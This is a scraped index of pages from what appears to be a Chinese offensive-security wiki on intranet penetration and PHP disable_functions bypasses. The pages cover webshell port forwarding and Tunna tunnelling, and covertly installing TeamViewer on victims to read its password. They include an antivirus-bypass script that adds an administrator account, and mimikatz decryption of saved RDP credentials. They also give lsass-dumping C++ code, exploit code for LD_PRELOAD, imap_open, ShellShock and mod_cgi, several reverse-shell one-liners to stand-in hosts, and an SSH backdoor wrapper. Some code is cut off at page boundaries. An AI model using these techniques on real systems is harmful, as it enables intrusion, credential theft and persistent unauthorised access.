ssocks转发的其他操作 第一步，用sSocks在VPS上建立3388与3389端口对应关系，实现流量互通： root @ kali：〜＃/ root / ssocks-0.0.14 / src / rcsocks -l 3389 -p 3389 -vv 第二步，从攻击端连接VPS的3388端口，建议用freerdp而非rdesktop，因为前者支持远程与本地连接等待，文本复制粘贴，挂载远程文件系统： root @kali：〜＃xfreerdp / u：administrator / p：admin / v：【你的ip】：3389 第三步，立即在大马上执行端口转发，可能需要连续多次点击开始： 注意，整个过程对步骤先后顺序敏感，VPS上rcsocks端口映射好以后就可以不管了，先在攻击端执行xfreerdp，让其会话保持，再在webshel​​l上转发内网的3389。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 17:43:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/Tunna/1.html":{"url":"内网渗透/内网穿透/Tunna/1.html","title":"Tunna","keywords":"","body":"Tunna 实现内网穿透 Github地址 https://github.com/SECFORCE/Tunna 注：Tunna是python2环境 下载到本地之后在webshells目录里有三种格式的脚本如下图 将对应格式的脚本文件传到网站目录中 然后本地执行 python proxy.py -u http://192.168.0.1/conn.php -l 6666 -r 3389 -v 如上命令是将内网主机的3389端口转发到本地的6666端口上 本地直接用mstsc链接127.0.0.1：6666即可 python proxy.py -u http://192.168.0.1/conn.php -l 6666 -a 172.0.0.2 -r 3389 如上命令是将内网其他主机的3389端口转发到本地的6666端口上 python proxy.py -u http://172.0.0.1/conn.php -l 1234 -r 22 -v -s 如上命令，加上-s参数是为了避免连接ssh中断 还有MSF利用tunna转发的方式，这里不做介绍了 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-10 15:46:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/teamviewer/1.html":{"url":"内网渗透/内网穿透/teamviewer/1.html","title":"Teamviewer内网穿透（一）","keywords":"","body":"Teamviewer内网穿透（一） 这里利用的原理是强行给对方机子安装上teamviwer，然后自动把tv的远程连接的密码生成到程序目录下的vtr.txt里面中，随即用自己本机的tv连接就行了 Github地址 https://github.com/ianxtianxt/teamview 复现流程 Github下载完之后，传入受害机中(我这里是本地虚拟机，就直接演示了) 如图 1、运行TV_V2.exe 会自己在受害机中装一个tv 会在当前目录下生成如下三个文件 2、运行生成的gps.exe文件 运行后会生成vtr.txt，这里面有ID和通行证 咱们给他装的teamviewer的密码就被读出来啦 连接！ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-26 21:40:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/teamviewer/2.html":{"url":"内网渗透/内网穿透/teamviewer/2.html","title":"Teamviewer内网穿透（二）","keywords":"","body":"Teamviewer内网穿透（二） 上传一个单文件版本的teamviewer 再通过下面指令运行起来 schtasks /create /sc minute /mo 1 /tn “cat” /tr TV的路径 /ru 创建的用户名 /rp 创建的密码 使用PIL截图获取连接ID密码： from PIL import ImageGrab im = ImageGrab.grab() im.save('screenshot.png') 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-26 21:41:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网渗透/金山毒霸/1.html":{"url":"内网渗透/内网渗透/金山毒霸/1.html","title":"Bypass金山毒霸","keywords":"","body":"金山毒霸添加用拦截功能绕过 相关厂商 金山毒霸 漏洞类型 拦截绕过 自评危害等级 高危 详细介绍： 金山毒霸添加用拦截功能绕过 POC如下： set wsnetwork=CreateObject(\"WSCRIPT.NETWORK\"):os=\"WinNT://\"&wsnetwork.ComputerName:Set ob=GetObject(os):Set oe=GetObject(os&\"/Administrators,group\"):Set od=ob.Create(\"user\",\"test\"):od.SetPassword \"password\":od.SetInfo:Set of=GetObject(os&\"/test\",user):oe.add os&\"/test\" 测试视频演示下载地址：https://pan.baidu.com/s/1YsRrLVeALZH0vudbCn6WPQ 0sec 链接如挂，请群内反馈,谢谢 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 00:52:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网渗透/DBscanner/1.html":{"url":"内网渗透/内网渗透/DBscanner/1.html","title":"DBscanner","keywords":"","body":"工具说明 自动扫描内网常见sql、no-sql数据库脚本(mysql、mssql、oracle、postgresql、redis、mongodb、memcached、elasticsearch)，包含未授权访问及常规弱口令检测 安装过程 运行于python2的环境下 pip install IPy pip install gevent pip install mysql-python /*如果遇到 WARNING: You are using pip version 19.2.3, however version 19.3 is available python -m pip install -U pip 下载 https://stackoverflow.com/questions/21440230/install-mysql-python-windows 然后，运行pip install mysqlclient；如果报错的话请运行pip install mysqlclient==1.3.4 安装低版本的mysqlclient */ pip install cx_Oracle pip install pymongo pip install psycopg2 注： 扫描整个c段的时候ip地址末尾一定要写0，否则会报错 python dbscan.py 192.168.50.0/24 Github: https://github.com/ianxtianxt/DBScanner/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-21 11:36:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网渗透/Windows常用程序密码读取工具/1.html":{"url":"内网渗透/内网渗透/Windows常用程序密码读取工具/1.html","title":"Windows常用程序密码读取工具","keywords":"","body":"Windows常用程序密码读取工具:SharpDecryptPwd 工具介绍 用于读取常用程序密码 如NavicatCrypto、TeamViewer、FileZilla、WinSCP等 使用方法 > SharpDecryptPwd.exe Author: Uknow Github: https://github.com/uknowsec/SharpDecryptPwd Reference: https://rcoil.me/2019/09/SharpDecryptPwd/ Usage: SharpDecryptPwd.exe -NavicatCrypto SharpDecryptPwd.exe -TeamViewer SharpDecryptPwd.exe -FileZilla SharpDecryptPwd.exe -WinSCP SharpDecryptPwd.exe -Xmangager -p Session_Path Github地址： https://github.com/ianxtianxt/SharpDecryptPwd/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-21 11:35:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网渗透/内网渗透之获取windows远程桌面（RDP）连接记录/1.html":{"url":"内网渗透/内网渗透/内网渗透之获取windows远程桌面（RDP）连接记录/1.html","title":"内网渗透之获取windows远程桌面（RDP）连接记录","keywords":"","body":"内网渗透之获取windows远程桌面（RDP）连接记录 利用条件：就是mstsc连接的时候，管理员勾选了自动保存密码连接的选项。 目标ip：172.xx.x.1 被控制ip:172.xx.x.12 在172.18.x.12中执行 C:\\Users\\Administrator>cmdkey /list 当前保存的凭据: 目标: LegacyGeneric:target=TERMSRV/172.xx.x.1 类型: 普通 用户: I3L2JDBDV6JENUP\\Administrator 本地机器持续时间 目标: LegacyGeneric:target=TERMSRV/xxxxx.xxxx.org 类型: 普通 用户: administrator 本地机器持续时间 如此可见，此服务器保存了两个连接地址，其中的172.xx.x.1就是我们想要获取到的地址。 1、查找本地的Credentials dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\* * 驱动器 C 中的卷是 系统 卷的序列号是 0000-6B3E C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials 的目录 2018/11/10 14:04 . 2018/11/10 14:04 .. 2018/11/09 17:05 466 92FB159ED290FC523E845094404697A8 2018/11/10 14:04 466 A1EC182214DD58D50DAB9E8850A9E75A 2 个文件 932 字节 2 个目录 3,507,884,032 可用字节 2、使用mimikatz进行操作 mimikatz dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\92FB159ED290FC523E845094404697A8 得到内容为： beacon> mimikatz dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\92FB159ED290FC523E845094404697A8 [*] Tasked beacon to run mimikatz's dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\92FB159ED290FC523E845094404697A8 command [+] host called home, sent: 961605 bytes [+] received output: **BLOB** dwVersion : 00000001 - 1 guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwMasterKeyVersion : 00000001 - 1 guidMasterKey : {9cb35799-f2c5-4897-9d60-3b84331db8ae} dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 00000012 - 18 szDescription : 本地凭据数据 algCrypt : 00006610 - 26128 (CALG_AES_256) dwAlgCryptLen : 00000100 - 256 dwSaltLen : 00000020 - 32 pbSalt : 8498307858a1e635b05a9e0dc6256e8ed91216ce3a562e678cc937ad4f9434ba dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 0000800e - 32782 (CALG_SHA_512) dwAlgHashLen : 00000200 - 512 dwHmac2KeyLen : 00000020 - 32 pbHmack2Key : 613bfaa4841894899cf3fa3bd34318c0e3ad53e5403c10d126f940c1cd91f510 dwDataLen : 000000e0 - 224 pbData : 9dd8efd32175a018eef0a0b52c2c082086ec677d2799926b69515b3fcac634ef7b0e1e0f202ba17934d38323e9b068bdef0d08cb3235d5a8efcbb55522f5f1b0f684f216a1a900a6b225863a54395b21dd4fcc699c71f31ba4fcb87292011b29ae12416509590fe30d9440672bb7ad2e02c4d797eef091afc9d48bdaf9d13659f2677b257071ffa60823c32efb2614d0604caaa1e112bef950002249dc555f04662be1ffb2ac0e7a7fb66c52ceb9479fa3150b7495d376627646aa8daaef18345281993db292bf8b39a2049d4b3bc9f914e31f03099677d84d7074b5c146327f dwSignLen : 00000040 - 64 pbSign : 1c5d185d5db9a9cdd6e3190d5236f36eddf84b08e3820cbfeff5026e0127adf103eeae501bd7f57003429a4b6ce30d9c3e7a3e16a3ee2b6514e5a631735a8987 3、使用sekurlsa::dpapi beacon> mimikatz sekurlsa::dpapi [*] Tasked beacon to run mimikatz's sekurlsa::dpapi command [+] host called home, sent: 961609 bytes [+] received output: Authentication Id : 0 ; 844082 (00000000:000ce132) Session : Interactive from 1 User Name : Administrator Domain : SD-201805241744 Logon Server : SD-201805241744 Logon Time : 2018/11/29 9:35:37 SID : S-1-5-21-879709706-2682151700-2389522846-500 [00000000] * GUID : {9cb35799-f2c5-4897-9d60-3b84331db8ae} * Time : 2018/12/8 15:37:36 * MasterKey : 6d3bb90e91c05b6561e9714f37d651c1297a36675299a2172d7bee9e3922dd26842d4b0bf1d246c61d6f1fe845bc48303a8d46138813e9aed552e1919c555561 * sha1(key) : d6cf5badd4fd758ac728878b8109ac8b3a6af865 [00000001] * GUID : {f9154b95-65a8-498d-9b24-f4c248ba70bb} * Time : 2018/12/11 17:45:59 * MasterKey : ec0864068100a6f158e8fa7be7b1e18bdb91cf4baba90d913ca060db56d8ca82c0a643cfd11a8303fbd04b2ad44bf2bbe5c494ee68d35fd7af1127b936c2b5b6 * sha1(key) : 06a11e1d91806cadbe06f010a0031cdb71ec4346 Authentication Id : 0 ; 997 (00000000:000003e5) Session : Service from 0 User Name : LOCAL SERVICE Domain : NT AUTHORITY Logon Server : (null) Logon Time : 2018/11/29 9:16:48 SID : S-1-5-19 Authentication Id : 0 ; 996 (00000000:000003e4) Session : Service from 0 User Name : SD-201805241744$ Domain : WorkGroup Logon Server : (null) Logon Time : 2018/11/29 9:16:47 SID : S-1-5-20 Authentication Id : 0 ; 49720 (00000000:0000c238) Session : UndefinedLogonType from 0 User Name : (null) Domain : (null) Logon Server : (null) Logon Time : 2018/11/29 9:16:46 SID : Authentication Id : 0 ; 999 (00000000:000003e7) Session : UndefinedLogonType from 0 User Name : SD-201805241744$ Domain : WorkGroup Logon Server : (null) Logon Time : 2018/11/29 9:16:46 SID : S-1-5-18 [00000000] * GUID : {e596b8f9-6923-4853-a59c-51d3346000dd} * Time : 2018/11/29 9:16:59 * MasterKey : de7a5ebccbeccaa08b4f9daeda81af94daf4ce53b22400bc26c281a68d7081d2a4039f359131890b9089917714b8810b25ec7658fa1e62cc2941630d307b89d4 * sha1(key) : 929fa099c7c1bf0293da3a9dbefc19ffe1c7d345 [00000001] * GUID : {77b81995-c130-478f-a592-7041d039f446} * Time : 2018/11/29 9:59:38 * MasterKey : ec6dcf103d177c4e69faac61e182e55d4ee7c6e242d9a5c6a5cde08aa440573155981c91340c4214cbc4911da628a3af2503b82d338b9ab2dee53b33fa044fdc * sha1(key) : dbda555a0e9740db7c61c5ce5880c4baaefdce28 [00000002] * GUID : {f1625647-969c-4fff-a63a-f77e4242b229} * Time : 2018/11/29 19:37:12 * MasterKey : 6ddc8cb28575ddd652fd1c88a9594d3a4a62607959acbf6e3a89e8372d577f6966f3420c47e086ae04e07afd0d778e100bc6408ea374087ee51fced40f5eccde * sha1(key) : b155b36b7f91ea110b42c479a6d40579f3e992ef [00000003] * GUID : {f22e410f-f947-4e08-8f2a-8f65df603f8d} * Time : 2018/11/29 9:16:46 * MasterKey : 19c05880b67d50f8231cd8009836e3cdc55610e4877f8b976abd5ca15600d0e759934324c6204b56f02527039e7fc52a1dfb5296d3381aaa7c3eb610dffa32fa * sha1(key) : b859b2b52e7e49cf5c70069745c88853c4b23487 根据目标凭据 GUID: {9cb35799-f2c5-4897-9d60-3b84331db8ae} 找到其关联的MasterKey，这个MasterKey就是加密凭据的密钥，即解密pbData所必须的东西。 4、解密 命令为： dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\92FB159ED290FC523E845094404697A8 /masterkey:6d3bb90e91c05b6561e9714f37d651c1297a36675299a2172d7bee9e3922dd26842d4b0bf1d246c61d6f1fe845bc48303a8d46138813e9aed552e1919c555561 随即即可获取到密码 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-21 22:11:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网渗透/利用windows api dump进程/1.html":{"url":"内网渗透/内网渗透/利用windows api dump进程/1.html","title":"利用windows api dump进程","keywords":"","body":"利用windows api dump进程 c++源代码 #include \"stdafx.h\" #include #include #include #include using namespace std; int main() { DWORD lsassPID = 0; HANDLE lsassHandle = NULL; HANDLE outFile = CreateFile(L\"lsass.dmp\", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 processEntry = {}; processEntry.dwSize = sizeof(PROCESSENTRY32); LPCWSTR processName = L\"\"; if (Process32First(snapshot, &processEntry)) { while (_wcsicmp(processName, L\"lsass.exe\") != 0) { Process32Next(snapshot, &processEntry); processName = processEntry.szExeFile; lsassPID = processEntry.th32ProcessID; } wcout https://github.com/ianxtianxt/windows-api-dump/ 执行演示 执行CreateMiniDump.exe（上面的编译文件）或编译自己的二进制文件 Lsass.dmp被转储到工作目录 让lsass.dmp离线到你的攻击机器上 打开mimikatz并加载到转储文件中 储存密码 .\\createminidump.exe .\\mimikatz.exe sekurlsa::minidump c:\\temp\\lsass.dmp sekurlsa::logonpasswords 可以在mimikatz中离线读取 这里有一个pdocdump可以执行相同的操作，并且不会被windows defender标记。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-26 17:45:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Disable functions/常规绕过.html":{"url":"安全技术/Disable functions/常规绕过.html","title":" 常规绕过 ","keywords":"","body":"常规绕过 1. exec 2. shell_exec 3. system 4. passthru 5. popen 6. proc_open array(\"pipe\", \"w\")); $handle = proc_open($command ,$descriptorspec , $pipes); while(!feof($pipes[1])) { echo fread($pipes[1], 1024); //fgets($pipes[1],1024); }?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 02:09:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Disable functions/mail.html":{"url":"安全技术/Disable functions/mail.html","title":" mail ","keywords":"","body":"Mail 前提条件 linux环境 putenv()、mail()可用 基本原理 当 disable_functions 禁用了命令执行函数，webshell 无法执行系统命令时，可以通过环境变量 LD_PRELOAD 劫持系统函数，来突破 disable_functions 限制执行操作系统命令 利用步骤 https://github.com/ianxtianxt/bypass_disablefunc_via_LD_PRELOAD 下载bypass_disablefunc.php和bypass_disablefunc_x64.so,并上传到目标服务器 执行命令 http://www.0-sec.org/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so cmd: 执行的命令 outpath: 读写权限目录 sopath: so文件的绝对路径 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 23:02:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Disable functions/errorlog.html":{"url":"安全技术/Disable functions/errorlog.html","title":" error_log ","keywords":"","body":"error_log https://github.com/ianxtianxt/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.php 将mail例子中的mail(\"\", \"\", \"\", \"\");替换为error_log(\"a\",1); example: http://www.0-sec.org/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so \"; $cmd = $_GET[\"cmd\"]; $out_path = $_GET[\"outpath\"]; $evil_cmdline = $cmd . \" > \" . $out_path . \" 2>&1\"; echo \" cmdline: \" . $evil_cmdline . \"\"; putenv(\"EVIL_CMDLINE=\" . $evil_cmdline); $so_path = $_GET[\"sopath\"]; putenv(\"LD_PRELOAD=\" . $so_path); error_log(\"a\",1); echo \" output: \" . nl2br(file_get_contents($out_path)) . \"\"; unlink($out_path); ?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 02:21:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Disable functions/3.html":{"url":"安全技术/Disable functions/3.html","title":" imagemagick+GhostScript ","keywords":"","body":"imagemagick+GhostScript exp 其中 imag.c文件需要编译，命令如下 gcc -shared -fPIC imag.c -o imag.so imag.c代码 #include #include void payload() { const char* cmd = \"nc -e /usr/bin/zsh 127.0.0.1 4444\"; system(cmd); } int fileno() { if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); } 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 12:10:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Disable functions/4.html":{"url":"安全技术/Disable functions/4.html","title":" 利用 pcntl_exec 绕过 ","keywords":"","body":"利用 pcntl_exec 绕过 1. 前提条件 PHP安装并启用了pcntl插件 2. 基本原理 利用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令，从而绕过disable_functions 3. exp exp.php #利用pcntl_exec()执行test.sh test.sh #!/bin/bash nc -e /bin/bash 1.1.1.1 8888 #反弹shell 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 12:15:25 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Disable functions/5.html":{"url":"安全技术/Disable functions/5.html","title":" 利用 imap_open函数任意命令执行 ","keywords":"","body":"利用 imap_open函数任意命令执行 1. 前提条件 目标开启了imap扩展，并支持imap_open()函数 2. 基本原理 PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。 3. exp /tmp/cmd_result\") . \"|base64\\t-d|sh}\"; imap_open('{' . $server . ':143/imap}INBOX', '', ''); sleep(5); echo file_get_contents(\"/tmp/cmd_result\"); ?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 12:17:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Disable functions/6.html":{"url":"安全技术/Disable functions/6.html","title":" 利用系统组件 window com 绕过 ","keywords":"","body":"利用系统组件 window com 绕过 1. 利用条件 Windows php5.x（高版本扩展要自己添加） 支持COM组件 2. 基本原理 COM组件它最早的设计意图是，跨语言实现程序组件的复用 COM组件由以Win 32动态连接库（DLL）或可执行文件（EXE）形式发布的可执行代码所组成。遵循COM规范编写出来的组件将能够满足对组件架构的所有要求。COM组件可以给应用程序、操作系统以及其他组件提供服务；自定义的COM组件可以在运行时刻同其他组件连接起来构成某个应用程序；COM组件可以动态的插入或卸出应用。 exec(\"cmd /c\".$command); //调用对象方法来执行命令 $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 12:22:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Disable functions/7.html":{"url":"安全技术/Disable functions/7.html","title":" 利用 Apache+mod_cgi+.htaccess 绕过 ","keywords":"","body":"利用 Apache+mod_cgi+.htaccess 绕过 1. 前提条件 启用mod-cgi 允许.htaccess文件 .htaccess可写 2. 基本原理 在apache的WEB环境中，我们经常会使用.htaccess这个文件来确定某个目录下的URL重写规则，特别是一些开源的CMS或者框架当中经常会用到，比如著名的开源论坛discuz!，就可以通过.htaccess文件实现URL的静态化，大部分PHP框架，例如ThinkPHP和Laravel，在apache环境下会用.htaccess文件实现路由规则。但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。 3. exp \\n\"; } if(!isset($_GET['checked'])) { @file_put_contents('.htaccess',\"\\nSetEnv HTACCESS on\", FILE_APPEND); header('Location: ' . $_SERVER['PHP_SELF']. '?checked=true'); //执行环境的检查 } else { $modcgi = in_array('mod_cgi',apache_get_modules()); // 检测mod_cgi是否开启 $writable = is_writable('.'); //检测当前目录是否可写 $htaccess = !empty($_SERVER['HTACCESS']);//检测是否启用了.htaccess checkEnabled(\"Mod-Cgienabled\",$modcgi,\"Yes\",\"No\"); checkEnabled(\"Iswritable\",$writable,\"Yes\",\"No\"); checkEnabled(\"htaccessworking\",$htaccess,\"Yes\",\"No\"); if(!($modcgi && $writable&& $htaccess)) { echo \"Error. All of the above mustbe true for the script to work!\"; //必须满足所有条件 } else { checkEnabled(\"Backing up.htaccess\",copy(\".htaccess\",\".htaccess.bak\"),\"Suceeded!Saved in .htaccess.bak\",\"Failed!\"); //备份一下原有.htaccess checkEnabled(\"Write .htaccessfile\",file_put_contents('.htaccess',\"Options +ExecCGI\\nAddHandlercgi-script .dizzle\"),\"Succeeded!\",\"Failed!\");//.dizzle，我们的特定扩展名 checkEnabled(\"Write shellfile\",file_put_contents('shell.dizzle',$shellfile),\"Succeeded!\",\"Failed!\");//写入文件 checkEnabled(\"Chmod777\",chmod(\"shell.dizzle\",0777),\"Succeeded!\",\"Failed!\");//给权限 echo \"Executing the script now.Check your listener \"; //调用 } } ?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 12:25:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Disable functions/8.html":{"url":"安全技术/Disable functions/8.html","title":" 利用 ImageMagick 漏洞绕过（一） ","keywords":"","body":"利用 ImageMagick 漏洞绕过（一） 1.利用条件 Imagick = 5.4 2.基本原理 ImageTragick（CVE-2016-3714） 漏洞的利用过程非常简单，只要将精心构造的图片上传至使用漏洞版本的ImageMagick，ImageMagick会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令。因此很多具有头像上传、图片转换、图片编辑等具备图片上传功能的网站都可能会中招。 3.exp readImage('KKKK.mvg'); $thumb->writeImage('KKKK.png'); $thumb->clear(); $thumb->destroy(); unlink(\"KKKK.mvg\"); unlink(\"KKKK.png\"); ?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 12:32:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Disable functions/9.html":{"url":"安全技术/Disable functions/9.html","title":" 利用 ImageMagick 漏洞绕过（二） ","keywords":"","body":"利用 ImageMagick 漏洞绕过（二） 1.利用条件 php 7.4 ffi.enable=true 2.基本原理 FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。 当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。 3.exp system($a); ?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 12:32:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Disable functions/10.html":{"url":"安全技术/Disable functions/10.html","title":" 利用 ShellShock 绕过 ","keywords":"","body":"利用 ShellShock 绕过 1. 前提条件 目标OS存在Bash破壳（CVE-2014-6271）漏洞 PHP 5.* linux putenv()、mail()可用 2. 基本原理 一般函数体内的代码不会被执行，但破壳漏洞会错误的将\"{}\"花括号外的命令进行执行 php里的某些函数(例如:mail()、imap_mail())能调用popen或其他能够派生bash子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令。 3. exp $tmp 2>&1\"); mail(\"a@127.0.0.1\",\"\",\"\",\"\",\"-bv\"); $output = @file_get_contents($tmp); @unlink($tmp); if($output != \"\") return $output; else return \"No output, or not vuln.\"; } echo shellshock($_REQUEST[\"cmd\"]); ?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 12:33:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/1.html":{"url":"安全技术/Linux后门/1.html","title":" LINUX反弹shell ","keywords":"","body":"LINUX反弹shell 关于反弹原理，和每一步的数据流向在网上都有文章，就不复制了。这里只是用来总结下常规反弹shell的用法，顺便说下优点缺点。 姿势一 bash -i >& /dev/tcp/127.0.0.1/6666 0>&1 优点：在大多数Liunx系统上都可以使用，缺点：在路由器系统中不存在bash，存在符号>、& 在反序列化中或者对符号转义的情况下就没有办法反弹了。 姿势二 python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\" 优点：在安装了python上的linux都可以使用，原理还是将标准输入、标准输出、标准错误输出重定向到远程。使用bash交互模式启动。缺点：在路由器系统中不存在bash或者阉割了python库，存在符号>、& 、'、\"在反序列化中或者对符号转义的情况下就没有办法反弹了。单双引号也会导致闭合问题。 姿势三 nc -e /bin/bash 127.0.0.1 6666 姿势四 一般Netcat有两个版本，一个版本是不提供反向连接的版本，一个是全功能版本。这两者的区别就是是否带-e参数，只有带-e参数的版本才支持反向连接。ubuntu 18.04安装的是不提供反向链接的版本。 wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gztar -zxvf netcat-0.7.1.tar.gz -C /usr/localcd /usr/localmv netcat-0.7.1 netcatcd /usr/local/netcat./configuremake && make install 优点：直接反弹，没有多余的符号。缺点：系统apt默认安装的都是不提供反向链接的版本，需要自己上传编译后的二进制版本。 解决方法1: nc 127.0.0.1 6666|/bin/bash|nc 127.0.0.1 7777 利用6666端口传入内容交给bash执行，再将内容从7777送出去，管道符的用法。可以在阉割功能的nc上使用。 解决方法2(针对某些mips架构的路由器&busybox终端的系统)： //锐捷 mkfifo /tmp/backpipe1 | /bin/sh 0/tmp/backpipe1 //飞鱼星反弹shell mkfifo /tmp/backpipe1 | /bin/sh 0/tmp/backpipe1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 17:03:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/Linux后门/2.html":{"url":"安全技术/Linux后门/2.html","title":" SSH wrapper ","keywords":"","body":"SSH wrapper 判断连接来源端口，将恶意端口来源访问传输内容重定向到/bin/sh中。 cd /usr/sbin/ mv sshd ../bin vim sshd //编辑sshd内容为以下 #!/usr/bin/perl exec\"/bin/sh\"if(getpeername(STDIN)=~/^..LF/); // \\x00\\x00LF是19526的大端形式 